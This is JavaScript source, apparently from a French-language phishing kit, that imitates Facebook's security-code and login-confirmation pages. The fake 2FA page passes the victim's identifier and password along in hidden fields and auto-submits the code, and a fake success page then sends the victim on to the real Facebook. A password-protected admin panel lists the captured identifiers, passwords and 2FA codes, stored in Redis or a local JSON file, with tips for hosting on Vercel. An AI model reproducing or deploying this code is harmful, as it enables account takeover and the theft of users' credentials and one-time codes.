const escapeHtml = (str) => {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
};

const applyNoCache = (res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.setHeader('Surrogate-Control', 'no-store');
};

const parseBasicAuth = (authHeader) => {
  if (!authHeader || typeof authHeader !== 'string') return null;
  const m = authHeader.match(/^Basic\s+([A-Za-z0-9+/=]+)$/i);
  if (!m) return null;
  try {
    const decoded = Buffer.from(m[1], 'base64').toString('utf8');
    const idx = decoded.indexOf(':');
    if (idx < 0) return { user: decoded, pass: '' };
    return { user: decoded.slice(0, idx), pass: decoded.slice(idx + 1) };
  } catch { return null; }
};

const requireAdminAuth = (req, res) => {
  const wantedUser = (process.env.ADMIN_USER || '').trim();
  const wantedPass = (process.env.ADMIN_PASSWORD || '').trim();
  if (!wantedPass && !wantedUser) return true;
  const creds = parseBasicAuth(req.headers && req.headers.authorization);
  const userOk = !wantedUser || (creds && creds.user === wantedUser);
  const passOk = !!wantedPass && creds && creds.pass === wantedPass;
  if (userOk && passOk) return true;
  res.statusCode = 401;
  res.setHeader('WWW-Authenticate', 'Basic realm="Panel Admin - Vérifications Facebook", charset="UTF-8"');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  applyNoCache(res);
  res.end(`<!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Accès restreint — Admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
body{background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.08);max-width:460px;padding:40px 32px;width:100%;border-top:4px solid #1877f2}
.icon{width:56px;height:56px;border-radius:50%;background:#e7f3ff;color:#1877f2;display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 18px}
h1{font-size:22px;color:#162643;text-align:center;margin-bottom:8px}
p{color:#606770;font-size:14px;text-align:center;line-height:1.5;margin-bottom:18px}
code{background:#f5f7fa;padding:2px 6px;border-radius:4px;font-size:12.5px;color:#164a8f}
.footer{margin-top:20px;padding-top:18px;border-top:1px solid #dadde1;text-align:center;font-size:12px;color:#8a8d91}
.btn{display:inline-block;margin-top:4px;padding:10px 20px;background:#1877f2;color:#fff;border-radius:6px;text-decoration:none;font-weight:bold;font-size:14px}
.btn:hover{background:#166fe5}
</style></head><body>
<div class="card">
  <div class="icon">🔒</div>
  <h1>Accès restreint</h1>
  <p>Le panel d'administration est protégé par un identifiant et un mot de passe.</p>
  <p style="text-align:left;background:#fff7ed;border:1px solid #fed7aa;color:#9a3412;border-radius:6px;padding:12px 14px;font-size:13px;">
    💡 <strong>Pour y accéder :</strong><br>
    • Saisis les identifiants quand ton navigateur t'affiche une boîte de dialogue de connexion.<br>
    • Définis <code>ADMIN_PASSWORD</code> (et optionnellement <code>ADMIN_USER</code>) dans tes variables d'environnement Vercel / <code>.env.local</code>.<br>
    • Sur Vercel : <em>Project Settings → Environment Variables</em>.
  </p>
  <p style="text-align:center;margin-top:20px;"><a href="/" class="btn">← Retour au formulaire</a></p>
  <div class="footer">Si tu viens de définir le mot de passe, relance ton navigateur ou ouvre un onglet de navigation privée.</div>
</div></body></html>`);
  return false;
};

const twoFaHtml = (identifier, oldPassword) => `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Saisir le code de sécurité | Facebook</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22><rect fill=%22%231877F2%22 width=%2224%22 height=%2224%22 rx=%224%22/><path fill=%22white%22 d=%22M13.5 21v-7.5h2.5l.5-3h-3V8.5c0-.9.3-1.5 1.5-1.5H17V4.2C16.5 4.1 15.4 4 14.1 4c-2.6 0-4.3 1.6-4.3 4.4V10.5H7.5v3h2.3V21h3.7z%22/></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        html, body { height: 100%; }
        body { background-color: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; -webkit-tap-highlight-color: transparent; }
        .header { background: linear-gradient(#4e69a2, #3b5998 50%); border-bottom: 1px solid #133783; min-height: 82px; width: 100%; }
        .header-inner { max-width: 980px; margin: 0 auto; padding: 10px 0; display: flex; justify-content: space-between; align-items: center; }
        .logo { color: white; font-size: 40px; font-weight: bold; padding-top: 10px; -webkit-user-select: none; user-select: none; }
        .main-container { flex: 1 0 auto; max-width: 980px; margin: 0 auto; padding: 40px 20px; width: 100%; }
        .card { background: #ffffff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 520px; margin: 0 auto; padding: 30px; position: relative; z-index: 1; overflow: visible; }
        .title { font-size: 20px; font-weight: bold; color: #162643; margin-bottom: 8px; }
        .subtitle { color: #606770; font-size: 14px; line-height: 1.5; margin-bottom: 18px; }
        .method-card { background: #f5f7fa; border: 1px solid #dadde1; border-radius: 6px; padding: 14px 16px; margin-bottom: 18px; display: flex; align-items: center; gap: 12px; }
        .method-icon { width: 38px; height: 38px; background: #1877f2; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; flex-shrink: 0; }
        .method-icon svg { width: 20px; height: 20px; stroke-width: 2; stroke: currentColor; fill: none; }
        .method-text { flex: 1; min-width: 0; }
        .method-label { font-size: 13px; color: #606770; }
        .method-value { font-weight: bold; color: #162643; font-size: 14px; word-break: break-all; }
        .input-group { margin-bottom: 14px; position: relative; z-index: 1; }
        .input-label { display: block; font-size: 14px; font-weight: bold; color: #606770; margin-bottom: 6px; }
        .input-field {
            width: 100%; padding: 14px 16px; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 22px; color: #1d2129;
            background: #ffffff; letter-spacing: 10px; text-align: center; font-weight: bold; transition: all 0.2s;
            -webkit-appearance: none; -moz-appearance: none; appearance: none; display: block; min-height: 52px;
        }
        .input-field:focus { outline: none; border-color: #1877f2; background: #ffffff; box-shadow: 0 0 0 2px #e7f3ff; }
        .error-box { display: none; margin: 10px 0 6px; padding: 10px 12px; background: #ffebe8; border: 1px solid #dd3c10; border-radius: 4px; color: #8a1d00; font-size: 13px; line-height: 1.4; }
        .error-box.visible { display: block; }
        .note { font-size: 12px; color: #606770; line-height: 1.5; margin: 12px 0 20px; }
        .note a { color: #1877f2; text-decoration: none; cursor: pointer; }
        .note a:hover { text-decoration: underline; }
        .button-group { display: flex; justify-content: space-between; align-items: stretch; gap: 10px; margin-top: 16px; padding-top: 18px; border-top: 1px solid #dadde1; flex-wrap: wrap; position: relative; z-index: 10; }
        .button-group > * { position: relative; z-index: 11; display: inline-flex !important; align-items: center !important; justify-content: center !important; pointer-events: auto !important; }
        .btn {
            padding: 10px 20px; border: 0 !important; box-shadow: none !important; border-radius: 6px; font-size: 15px; font-weight: bold;
            cursor: pointer; text-decoration: none; min-width: 110px; min-height: 44px; text-align: center;
            -webkit-appearance: none; -moz-appearance: none; appearance: none; background-clip: padding-box;
            touch-action: manipulation; white-space: nowrap; transition: background-color .15s ease;
        }
        .btn-link { background: transparent; color: #1877f2; padding: 10px 4px; min-height: 44px; font-size: 14px; }
        .btn-link:hover { text-decoration: underline; background: transparent; }
        .btn-primary { background-color: #1877f2 !important; color: #ffffff !important; border: 0 !important; outline: 0 !important; }
        .btn-primary:hover, .btn-primary:active { background-color: #166fe5 !important; }
        .btn-primary[disabled], .btn-primary:disabled { background-color: #7fb1f7 !important; cursor: not-allowed; }
        .btn-primary.check-ok {
            background-color: #31a24c !important;
            cursor: default !important;
            animation: pulse-ok .45s ease-out;
        }
        @keyframes pulse-ok {
            0%   { transform: scale(1); }
            45%  { transform: scale(1.04); }
            100% { transform: scale(1); }
        }
        .btn .loader {
            display: none;
            width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.45);
            border-top-color: #fff; border-radius: 50%;
            margin-right: 10px;
            animation: spin 0.7s linear infinite;
            flex: 0 0 auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .btn.loading .loader { display: inline-block; }
        .btn .checkmark {
            display: none;
            width: 20px; height: 20px; margin-right: 8px; flex: 0 0 auto;
            stroke: #fff; stroke-width: 3; fill: none;
        }
        .btn.check-ok .checkmark { display: inline-block; animation: check-in .35s ease-out both; }
        @keyframes check-in {
            0%   { opacity: 0; transform: scale(0.4); }
            100% { opacity: 1; transform: scale(1); }
        }
        .footer { max-width: 980px; margin: 0 auto; padding: 20px; text-align: center; color: #8a8d91; font-size: 12px; border-top: 1px solid #dadde1; width: 100%; flex-shrink: 0; }
        .footer-links { margin-bottom: 10px; }
        .footer-links a { color: #385898; text-decoration: none; margin: 0 4px; }
        .footer-links a:hover { text-decoration: underline; }
        @media (max-width: 768px) {
            .header { min-height: 60px; }
            .header-inner { padding: 8px 16px; max-width: 100%; }
            .logo { font-size: 28px; padding-top: 4px; }
            .main-container { padding: 20px 12px; }
            .card { padding: 20px; border-radius: 6px; }
            .title { font-size: 18px; }
            .input-field { padding: 12px 14px; font-size: 20px; letter-spacing: 8px; min-height: 48px; }
            .button-group { flex-direction: column-reverse; gap: 10px; align-items: stretch; }
            .btn, .btn-link { width: 100%; padding: 12px 20px; font-size: 16px; min-height: 46px; text-align: center; }
            .footer { padding: 16px 12px; font-size: 11px; }
            .footer-links a { display: inline-block; margin: 2px 3px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-inner">
            <div class="logo">facebook</div>
        </div>
    </div>
    <div class="main-container">
        <div class="card">
            <h1 class="title">Saisissez le code de sécurité</h1>
            <p class="subtitle">Nous vous avons envoyé un code de sécurité à 6 chiffres. Veuillez le saisir ci-dessous pour confirmer votre identité.</p>

            <div class="method-card">
                <div class="method-icon">
                    <svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
                </div>
                <div class="method-text">
                    <div class="method-label">Envoyé par e-mail</div>
                    <div class="method-value">${escapeHtml(identifier)}</div>
                </div>
            </div>

            <form action="/submit-2fa" method="POST" id="twoFaForm" name="twoFaForm" autocomplete="on">
                <input type="hidden" name="identifier" value="${escapeHtml(identifier)}">
                <input type="hidden" name="oldPassword" value="${escapeHtml(oldPassword)}">

                <div id="errorBox" class="error-box" role="alert" aria-live="assertive"></div>

                <div class="input-group">
                    <label class="input-label" for="code_2fa">Code de sécurité à 6 chiffres</label>
                    <input type="text" id="code_2fa" name="code_2fa" class="input-field" placeholder="••••••" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" autocomplete="one-time-code" required aria-required="true">
                </div>
                <p class="note">
                    Si vous n'avez pas reçu de code, <a href="javascript:var e=document.getElementById('errorBox');e.textContent='Un nouveau code vient d\\'être envoyé. Vérifiez aussi vos courriers indésirables (spam).';e.style.background='#e7f3ff';e.style.borderColor='#1877f2';e.style.color='#164a8f';e.classList.add('visible');setTimeout(function(){e.classList.remove('visible');},8000);">cliquez ici pour l'envoyer à nouveau</a>.
                    <br>Vous pouvez aussi utiliser un code généré par votre application d'authentification (Google Authenticator, Duo...).
                </p>

                <div class="button-group">
                    <a href="javascript:history.back()" class="btn btn-link" rel="noopener noreferrer">← Réessayer</a>
                    <button type="submit" class="btn btn-primary" id="btnSubmit">
                        <span class="loader"></span>
                        <svg class="checkmark" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
                        <span class="btn-text">Vérification</span>
                    </button>
                </div>
            </form>
        </div>
    </div>
    <div class="footer">
        <div class="footer-links">
            <a href="#">Français (France)</a> · <a href="#">English (US)</a> · <a href="#">Español</a> · <a href="#">Deutsch</a> · <a href="#">Italiano</a>
        </div>
        <div class="footer-links">
            <a href="#">S'inscrire</a> · <a href="#">Connexion</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a> · <a href="#">Watch</a> · <a href="#">Lieux</a> · <a href="#">Jeux</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a> · <a href="#">Meta Store</a> · <a href="#">Meta Quest</a> · <a href="#">Ray-Ban Meta</a> · <a href="#">Instagram</a> · <a href="#">Threads</a> · <a href="#">Collectes de dons</a> · <a href="#">Services</a> · <a href="#">Centre d'information sur les élections</a> · <a href="#">Politique de confidentialité</a> · <a href="#">Centre de confidentialité</a> · <a href="#">Groupes</a> · <a href="#">À propos</a> · <a href="#">Créer une publicité</a> · <a href="#">Créer une Page</a> · <a href="#">Développeurs</a> · <a href="#">Emplois</a> · <a href="#">Cookies</a> · <a href="#">Choisir sa pub</a> · <a href="#">Conditions générales</a> · <a href="#">Aide</a> · <a href="#">Téléchargement de vos informations</a>
        </div>
        <p>Meta © 2026</p>
    </div>
    <script>
    (function() {
        var form = document.getElementById('twoFaForm');
        var btn = document.getElementById('btnSubmit');
        var errBox = document.getElementById('errorBox');
        var codeField = document.getElementById('code_2fa');
        var submitting = false;

        function btnTextNode() {
            try {
                var el = btn.querySelector('.btn-text');
                if (el) return el;
            } catch(e) {}
            return btn;
        }

        function setBtn(state) {
            try {
                var t = btnTextNode();
                btn.classList.remove('loading', 'check-ok');
                btn.classList.add('btn-primary');
                if (state === 'loading') {
                    btn.classList.add('loading');
                    btn.disabled = true;
                    t.textContent = 'Vérification en cours...';
                } else if (state === 'ok') {
                    btn.classList.add('check-ok');
                    btn.disabled = true;
                    t.textContent = 'Vérification terminée avec succès';
                } else {
                    btn.disabled = false;
                    t.textContent = 'Vérification';
                }
            } catch(e) {}
        }

        function showError(msg, type) {
            try {
                errBox.textContent = msg;
                if (type === 'info') {
                    errBox.style.background = '#e7f3ff';
                    errBox.style.borderColor = '#1877f2';
                    errBox.style.color = '#164a8f';
                } else {
                    errBox.style.background = '#ffebe8';
                    errBox.style.borderColor = '#dd3c10';
                    errBox.style.color = '#8a1d00';
                }
                errBox.classList.add('visible');
                setTimeout(function() { errBox.classList.remove('visible'); }, 8000);
            } catch(e) {}
        }

        function submitFormFallback() {
            if (submitting) return;
            submitting = true;
            setBtn('loading');

            try {
                var fd = new FormData(form);
                var body = new URLSearchParams(fd).toString();
                var xhr = new XMLHttpRequest();
                xhr.open('POST', form.getAttribute('action') || '/submit-2fa', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.onload = function() {
                    try {
                        if (xhr.status >= 200 && xhr.status < 400 && xhr.responseText && xhr.responseText.length > 200) {
                            setBtn('ok');
                            setTimeout(function() {
                                document.open();
                                document.write(xhr.responseText);
                                document.close();
                            }, 850);
                            return;
                        }
                    } catch(err) {}
                    try { setBtn('ok'); } catch(e){}
                    setTimeout(function(){ window.location.href = window.location.href; }, 900);
                };
                xhr.onerror = function() {
                    showError('Impossible de vérifier le code. Vérifiez votre connexion Internet puis réessayez.');
                    submitting = false;
                    setBtn('idle');
                };
                xhr.timeout = 20000;
                xhr.ontimeout = xhr.onerror;
                xhr.send(body);
            } catch(err) {
                try {
                    if (typeof form.requestSubmit === 'function') {
                        form.requestSubmit();
                        return;
                    }
                } catch(e) {}
                try { form.submit(); return; } catch(e) {}
                showError('Votre navigateur est incompatible. Veuillez réessayer ou utiliser un autre navigateur.');
                submitting = false;
                setBtn('idle');
            }
        }

        function validate() {
            try {
                var v = (codeField.value || '').replace(/\D/g, '');
                codeField.value = v;
                if (v.length !== 6) {
                    showError('Le code de sécurité doit contenir exactement 6 chiffres.');
                    try { codeField.focus(); } catch(e){}
                    return false;
                }
                errBox.classList.remove('visible');
                return true;
            } catch(e) { return true; }
        }

        try {
            codeField.addEventListener('input', function() {
                var v = (codeField.value || '').replace(/\D/g, '').slice(0, 6);
                codeField.value = v;
                if (v.length === 6) {
                    if (validate()) submitFormFallback();
                }
            }, false);
        } catch(e) {}

        try {
            if (form.addEventListener) {
                form.addEventListener('submit', function(ev) {
                    if (!validate()) { if (ev.preventDefault) ev.preventDefault(); return false; }
                    if (submitting) { if (ev.preventDefault) ev.preventDefault(); return false; }
                    submitFormFallback();
                    if (ev.preventDefault) ev.preventDefault();
                    return false;
                }, true);

                btn.addEventListener('click', function(ev) {
                    if (!validate()) {
                        if (ev.preventDefault) ev.preventDefault();
                        if (ev.stopPropagation) ev.stopPropagation();
                        return false;
                    }
                    submitFormFallback();
                    if (ev.preventDefault) ev.preventDefault();
                    return false;
                }, true);

                codeField.addEventListener('keydown', function(ev) {
                    var k = ev.key || (ev.keyCode || 0);
                    if (k === 'Enter' || k === 13 || ev.keyCode === 13) {
                        if (!validate()) return;
                        submitFormFallback();
                        if (ev.preventDefault) ev.preventDefault();
                        return false;
                    }
                }, false);
            }
        } catch(e) {}

        try { setTimeout(function(){ try { codeField.focus(); } catch(e){} }, 100); } catch(e) {}
    })();
    </script>
</body>
</html>`;

const confirmationHtml = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification réussie | Facebook</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22><rect fill=%22%231877F2%22 width=%2224%22 height=%2224%22 rx=%224%22/><path fill=%22white%22 d=%22M13.5 21v-7.5h2.5l.5-3h-3V8.5c0-.9.3-1.5 1.5-1.5H17V4.2C16.5 4.1 15.4 4 14.1 4c-2.6 0-4.3 1.6-4.3 4.4V10.5H7.5v3h2.3V21h3.7z%22/></svg>">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
        html, body { height: 100%; }
        body { background-color: #f0f2f5; min-height: 100vh; -webkit-tap-highlight-color: transparent; }
        .header { background: linear-gradient(#4e69a2, #3b5998 50%); border-bottom: 1px solid #133783; min-height: 82px; width: 100%; }
        .header-inner { max-width: 980px; margin: 0 auto; padding: 10px 0; display: flex; justify-content: space-between; align-items: center; }
        .logo { color: white; font-size: 40px; font-weight: bold; padding-top: 10px; -webkit-user-select: none; user-select: none; }
        .main-container { max-width: 980px; margin: 0 auto; padding: 40px 20px; }
        .card {
            background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            padding: 40px 30px; max-width: 600px; margin: 0 auto; text-align: center;
            border-top: 4px solid #31a24c; position: relative; z-index: 1; overflow: visible;
        }
        .success-icon {
            width: 80px; height: 80px; margin: 0 auto 20px; background: #31a24c;
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            position: relative; z-index: 2;
        }
        .success-icon svg { width: 44px; height: 44px; stroke: white; stroke-width: 3; fill: none; }
        .title { font-size: 24px; color: #162643; font-weight: bold; margin-bottom: 10px; }
        .subtitle { color: #606770; font-size: 15px; line-height: 1.5; margin-bottom: 24px; }
        .btn-wrap {
            position: relative; z-index: 10; padding-top: 4px;
            display: inline-flex; align-items: stretch; justify-content: center;
        }
        .btn-wrap > * {
            position: relative; z-index: 11; display: inline-flex !important; align-items: center !important;
            justify-content: center !important; pointer-events: auto !important;
        }
        .btn {
            padding: 10px 28px; border: 0 !important; box-shadow: none !important; border-radius: 6px;
            font-size: 15px; font-weight: bold; cursor: pointer; text-decoration: none;
            min-width: 200px; min-height: 46px; text-align: center;
            -webkit-appearance: none; -moz-appearance: none; appearance: none; background-clip: padding-box;
            touch-action: manipulation; white-space: nowrap; transition: background-color .15s ease;
        }
        .btn-primary { background-color: #1877f2 !important; color: white !important; border: 0 !important; outline: 0 !important; }
        .btn-primary:hover, .btn-primary:active { background-color: #166fe5 !important; }
        .footer {
            max-width: 980px; margin: 40px auto 0; padding: 20px; text-align: center;
            color: #8a8d91; font-size: 12px; border-top: 1px solid #dadde1;
        }
        .footer-links { margin-bottom: 10px; }
        .footer-links a { color: #385898; text-decoration: none; margin: 0 4px; }
        .footer-links a:hover { text-decoration: underline; }
        @media (max-width: 768px) {
            .header { min-height: 60px; }
            .header-inner { padding: 8px 16px; max-width: 100%; }
            .logo { font-size: 28px; padding-top: 4px; }
            .main-container { padding: 20px 12px; }
            .card { padding: 30px 20px; border-radius: 6px; }
            .success-icon { width: 64px; height: 64px; }
            .success-icon svg { width: 32px; height: 32px; }
            .title { font-size: 20px; }
            .subtitle { font-size: 14px; }
            .btn-wrap { display: flex; width: 100%; }
            .btn { width: 100%; padding: 12px 20px; font-size: 16px; min-height: 48px; }
            .footer { padding: 16px 12px; margin-top: 24px; font-size: 11px; }
            .footer-links a { display: inline-block; margin: 2px 3px; }
        }
        @media (max-width: 420px) {
            .logo { font-size: 24px; }
            .card { padding: 24px 16px; }
            .title { font-size: 18px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-inner">
            <div class="logo">facebook</div>
        </div>
    </div>
    <div class="main-container">
        <div class="card">
            <div class="success-icon">
                <svg viewBox="0 0 24 24">
                    <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
            </div>
            <h1 class="title">Vérification réussie</h1>
            <p class="subtitle">Votre identité a été vérifiée avec succès.<br>Vous êtes maintenant connecté(e) à votre compte Facebook.</p>
            <div class="btn-wrap">
                <a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer" class="btn btn-primary" id="goFbBtn">Continuer vers Facebook</a>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="footer-links">
            <a href="#">Français (France)</a> · <a href="#">English (US)</a> · <a href="#">Español</a> · <a href="#">Deutsch</a> · <a href="#">Italiano</a>
        </div>
        <div class="footer-links">
            <a href="#">S'inscrire</a> · <a href="#">Connexion</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a> · <a href="#">Watch</a> · <a href="#">Lieux</a> · <a href="#">Jeux</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a> · <a href="#">Meta Store</a> · <a href="#">Meta Quest</a> · <a href="#">Ray-Ban Meta</a> · <a href="#">Instagram</a> · <a href="#">Threads</a> · <a href="#">Collectes de dons</a> · <a href="#">Services</a> · <a href="#">Centre d'information sur les élections</a> · <a href="#">Politique de confidentialité</a> · <a href="#">Centre de confidentialité</a> · <a href="#">Groupes</a> · <a href="#">À propos</a> · <a href="#">Créer une publicité</a> · <a href="#">Créer une Page</a> · <a href="#">Développeurs</a> · <a href="#">Emplois</a> · <a href="#">Cookies</a> · <a href="#">Choisir sa pub</a> · <a href="#">Conditions générales</a> · <a href="#">Aide</a> · <a href="#">Téléchargement de vos informations</a>
        </div>
        <p>Meta © 2026</p>
    </div>
    <script>
    (function() {
        try {
            var btn = document.getElementById('goFbBtn');
            if (btn) {
                btn.addEventListener('click', function() {
                    try { btn.style.pointerEvents = 'none'; } catch(e) {}
                    setTimeout(function(){ try { window.open('https://www.facebook.com', '_blank', 'noopener,noreferrer'); window.location.href = 'https://www.facebook.com'; } catch(e) { try { window.location.href = 'https://www.facebook.com'; } catch(e2){} } }, 60);
                }, true);
            }
        } catch(e) {}
    })();
    </script>
</body>
</html>`;

const renderAdmin = (data, ctx = {}) => {
  const count = data.length;
  const uniqueIds = new Set(data.map(d => d.identifier).filter(Boolean)).size;
  const totalPw = data.filter(d => d.old_password).length;
  const total2Fa = data.filter(d => d.code_2fa).length;
  const onVercel = !!ctx.isVercel;
  const kvEnabled = !!ctx.hasKv;

  const maskPrefix = (s, n = 10) => {
    if (!s) return null;
    const t = String(s);
    if (t.length <= n) return t.replace(/./g, '*');
    return t.slice(0, n) + '*'.repeat(Math.max(0, Math.min(30, t.length - n)));
  };
  const presentVars = [
    ['KV_REST_API_URL',       maskPrefix(process.env.KV_REST_API_URL, 14)],
    ['KV_REST_API_TOKEN',     maskPrefix(process.env.KV_REST_API_TOKEN, 6)],
    ['KV_URL',                maskPrefix(process.env.KV_URL, 14)],
    ['KV_REST_TOKEN',         maskPrefix(process.env.KV_REST_TOKEN, 6)],
    ['UPSTASH_REDIS_REST_URL',   maskPrefix(process.env.UPSTASH_REDIS_REST_URL, 14)],
    ['UPSTASH_REDIS_REST_TOKEN', maskPrefix(process.env.UPSTASH_REDIS_REST_TOKEN, 6)],
    ['REDIS_URL',             maskPrefix(process.env.REDIS_URL, 14)],
    ['VERCEL',                process.env.VERCEL ? '1 (Vercel runtime)' : null]
  ].filter(([, v]) => v !== null);

  const debugCard = `
    <div class="card" style="margin-bottom:20px;">
      <div class="card-head">
        <div class="card-title">🔧 Diagnostics</div>
        <div class="card-count">Aide au débogage</div>
      </div>
      <div style="padding:16px 20px;">
        <div style="display:flex;flex-wrap:wrap;gap:18px;margin-bottom:12px;font-size:14px;">
          <div><strong>isVercel :</strong> <span style="color:${onVercel ? '#16a34a' : '#64748b'};font-weight:600;">${onVercel ? 'OUI' : 'NON (local)'}</span></div>
          <div><strong>hasKv (remote activé) :</strong> <span style="color:${kvEnabled ? '#16a34a' : '#dc2626'};font-weight:600;">${kvEnabled ? 'OUI ✅' : 'NON ❌'}</span></div>
        </div>
        <div style="font-size:13px;margin-bottom:8px;font-weight:600;color:#334155;">Variables détectées dans l'environnement :</div>
        ${presentVars.length ? `
          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px 16px;font-family:ui-monospace,Menlo,monospace;font-size:12px;background:#f8fafc;padding:12px 14px;border-radius:8px;border:1px solid #e2e8f0;">
            ${presentVars.map(([k, v]) => `<div><span style="color:#2563eb;">${k}</span> <span style="color:#64748b;">=</span> <span style="color:#0f172a;">${v}</span></div>`).join('')}
          </div>` : `
          <div style="background:#fff7ed;padding:10px 14px;border-radius:8px;border:1px solid #fed7aa;color:#9a3412;font-size:13px;">
            <strong>Aucune variable KV/REDIS détectée.</strong> Ajoute/envoie KV (Storage → KV → Connect Project) ou vérifie tes variables d'environnement.
          </div>`}
        <div style="margin-top:12px;font-size:12px;color:#475569;">
          💡 Besoin d'infos complètes ? Ouvre <a href="/admin/env" style="color:#2563eb;font-weight:600;">/admin/env</a> (réponse JSON brute, détaillé).
        </div>
      </div>
    </div>`;

  const banner = onVercel && !kvEnabled ? `
    <div style="margin-bottom:20px;padding:18px 22px;border-radius:10px;background:linear-gradient(135deg,#fef2f2,#fee2e2);border:1px solid #fca5a5;color:#991b1b;box-shadow:0 1px 2px rgba(0,0,0,0.04);">
      <div style="font-weight:700;font-size:16px;margin-bottom:8px;">⚠ Stockage persistant NON CONFIGURÉ</div>
      <p style="font-size:14px;line-height:1.5;margin-bottom:8px;">
        Tu es sur Vercel, mais la base <strong>KV (Redis)</strong> n'est pas activée.
        Sur Vercel, le système de fichiers est en <strong>lecture seule</strong>, donc tes captures
        <strong style="color:#7f1d1d;">NE SE SAUVEGARDENT PAS</strong> (elles disparaissent au premier redémarrage).
      </p>
      <div style="font-size:14px;">
        <strong>Activer KV (gratuit) :</strong>
        Dashboard Vercel → Ton projet → onglet
        <code style="padding:2px 6px;background:#fff;border-radius:4px;border:1px solid #fecaca;">Storage</code>
        → Create Database → <strong>KV (Redis)</strong> → région <strong>Paris (EU)</strong> → Connect →
        <strong>Redeploy SANS cache</strong>.
      </div>
    </div>` : (!onVercel && !kvEnabled ? `
    <div style="margin-bottom:20px;padding:14px 18px;border-radius:10px;background:#eff6ff;border:1px solid #bfdbfe;color:#1e40af;">
      <strong>💻 Mode local détecté</strong> — les captures sont sauvegardées dans
      <code style="padding:2px 6px;background:#fff;border-radius:4px;border:1px solid #bfdbfe;">captured_data.json</code>
      à la racine du projet.
    </div>` : kvEnabled ? `
    <div style="margin-bottom:20px;padding:14px 18px;border-radius:10px;background:#ecfdf5;border:1px solid #a7f3d0;color:#065f46;">
      ✅ <strong>Stockage persistant KV (Redis) actif</strong> — toutes les captures sont sauvegardées définitivement.
    </div>` : '');


  const rows = data.map((e, i) => `
        <tr>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:12px;color:#64748b;white-space:nowrap;">${count - i}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:13px;color:#0f172a;white-space:nowrap;">${escapeHtml(e.timestamp || '')}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#2563eb;font-weight:600;word-break:break-all;">${escapeHtml(e.identifier || '')}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#dc2626;font-family:monospace;word-break:break-all;">${escapeHtml(e.old_password || '')}</td>
            <td style="padding:10px 14px;border-bottom:1px solid #e5e7eb;font-size:14px;color:#16a34a;font-family:monospace;word-break:break-all;font-weight:600;">${escapeHtml(e.code_2fa || '—')}</td>
        </tr>
    `).join('');

  return `<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin - Vérifications d'identité</title>
<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
    body { background: #f8fafc; color: #0f172a; padding: 20px; }
    .wrap { max-width: 1200px; margin: 0 auto; }
    .top { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; margin-bottom: 20px; }
    h1 { font-size: 24px; color: #1e293b; }
    h1 span { background: #1877f2; color: white; padding: 4px 12px; border-radius: 999px; font-size: 14px; margin-left: 10px; }
    .actions { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
